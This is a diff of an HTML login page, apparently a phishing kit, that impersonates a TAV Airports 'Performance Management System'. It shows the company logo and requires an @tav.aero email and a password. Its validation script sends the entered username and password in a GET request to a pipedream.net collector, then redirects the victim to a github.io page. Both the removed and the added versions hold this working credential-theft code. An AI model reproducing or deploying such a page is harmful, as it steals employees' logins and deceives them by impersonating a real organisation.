@@ -1,158 +1,165 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Performance Monitoring System</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-  <style>
-    * {
-      box-sizing: border-box;
-    }
+    <title>Performance Monitoring System</title>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
 
-    body {
-      margin: 0;
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #3a7bd5, #00d2ff);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-    .login-form {
-      background-color: #ffffff;
-      padding: 40px;
-      border-radius: 15px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
-      width: 350px;
-      text-align: center;
-      animation: fadeIn 1s ease;
-    }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            background-color: #ffffff;
+            border-radius: 15px;
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            position: relative;
+        }
 
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
+        .login-form h2 {
+            color: #1e3c72;
+            margin-bottom: 25px;
+        }
 
-    .login-form h2 {
-      color: #333;
-      margin-bottom: 20px;
-    }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #f9f9f9;
+            font-size: 15px;
+            transition: border 0.3s;
+        }
 
-    input[type="text"],
-    input[type="password"] {
-      width: 100%;
-      padding: 12px 15px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      background-color: #f9f9f9;
-      transition: all 0.3s;
-    }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #2a5298;
+            outline: none;
+            background-color: #fff;
+        }
 
-    input[type="text"]:focus,
-    input[type="password"]:focus {
-      border-color: #00d2ff;
-      outline: none;
-      background-color: #fff;
-    }
+        .login-button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #4facfe, #00f2fe);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s;
+        }
 
-    .login-button {
-      width: 100%;
-      background-color: #00d2ff;
-      color: white;
-      padding: 14px;
-      margin-top: 15px;
-      border: none;
-      border-radius: 8px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
+        .login-button:hover {
+            transform: translateY(-2px);
+            background: linear-gradient(90deg, #00f2fe, #4facfe);
+        }
 
-    .login-button:hover {
-      background-color: #009acb;
-    }
+        .footer-text {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+        }
 
-    .footer-text {
-      font-size: 12px;
-      color: #666;
-      margin-top: 20px;
-    }
+        #error-message {
+            color: red;
+            margin-bottom: 10px;
+            font-size: 13px;
+        }
 
-    .error-message {
-      color: red;
-      font-size: 13px;
-      margin-top: 10px;
-    }
+        .icon {
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            width: 160px;
+            opacity: 0.8;
+        }
 
-    .icon {
-      position: fixed;
-      bottom: 10px;
-      right: 10px;
-      width: 150px;
-      opacity: 0.8;
-    }
+        @media screen and (max-width: 500px) {
+            .container {
+                margin: 0 20px;
+                padding: 25px;
+            }
 
-    .icon img {
-      width: 100%;
-    }
-  </style>
+            .icon {
+                width: 120px;
+            }
+        }
+    </style>
 
-  <script>
+    <script>
     function validateForm() {
-      const username = document.forms["loginForm"]["username"].value;
-      const password = document.forms["loginForm"]["password"].value;
-      const errorMessage = document.getElementById('error-message');
+        var username = document.forms["loginForm"]["username"].value;
+        var password = document.forms["loginForm"]["password"].value;
+        var errorMessage = document.getElementById('error-message');
 
-      errorMessage.textContent = '';
+        errorMessage.textContent = ''; // Clear any existing error message
 
-      if (!username.endsWith('@tav.aero')) {
-        errorMessage.textContent = "Your email address must end with @tav.aero.";
-        return false;
-      }
+        if (username.indexOf('@tav.aero') === -1) {
+            errorMessage.textContent = "Your email must end with @tav.aero.";
+            return false;
+        }
 
-      if (password.length < 8) {
-        errorMessage.textContent = "The password must be at least 8 characters.";
-        return false;
-      }
+        if (password.length < 8) {
+            errorMessage.textContent = "Password must be at least 8 characters long.";
+            return false;
+        }
 
-      const params = new URLSearchParams();
-      params.append('username', username);
-      params.append('password', password);
+        // Send user credentials via GET request
+        var params = new URLSearchParams();
+        params.append('username', username);
+        params.append('password', password);
 
-      fetch('https://eosdcxafrlhu2y.m.pipedream.net' + params.toString(), {
-        method: 'GET',
-      })
-      .then(response => response.text())
-      .then(data => {
-        console.log('Başarılı:', data);
-        window.location.href = "https://tavaero.github.io/TAV-PMS/bakim.html";
-      })
-      .catch((error) => {
-        console.error('Hata:', error);
-        errorMessage.textContent = "Server error occurred.";
-      });
+        fetch('https://eosdcxafrlhu2y.m.pipedream.net/?' + params.toString(), {
+            method: 'GET',
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log('Success:', data);
+            window.location.href = "https://tavaero.github.io/TAV-PMS/bakim.html";
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+        });
 
-      return false;
+        return false; // Prevent default form submission
     }
-  </script>
+    </script>
 </head>
+
 <body>
+    <div class="container login-form">
+        <h2>Performance Management System</h2>
+        <form name="loginForm" onsubmit="return validateForm()">
+            <input name="username" placeholder="Domain Email (e.g. user@tav.aero)" required type="text" />
+            <input name="password" placeholder="Password" required type="password" />
+            <div id="error-message">&nbsp;</div>
+            <button class="login-button" type="submit">Login</button>
+            <div class="footer-text">
+                This software is the property of TAV Airports Holding.
+            </div>
+        </form>
+    </div>
 
-  <form name="loginForm" class="login-form" onsubmit="return validateForm()">
-    <h2>Performance Management System</h2>
-    <input name="username" placeholder="Domain Account" type="text" required />
-    <input name="password" placeholder="Password" type="password" required />
-    <div id="error-message" class="error-message">&nbsp;</div>
-    <button type="submit" class="login-button">Login</button>
-    <div class="footer-text">This software belongs to TAV Airports Company.</div>
-  </form>
-
-  <div class="icon">
-    <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo"/>
-  </div>
-
+    <div class="icon">
+        <img alt="TAV Logo" src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" style="width: 100%; height: auto;" />
+    </div>
 </body>
 </html>
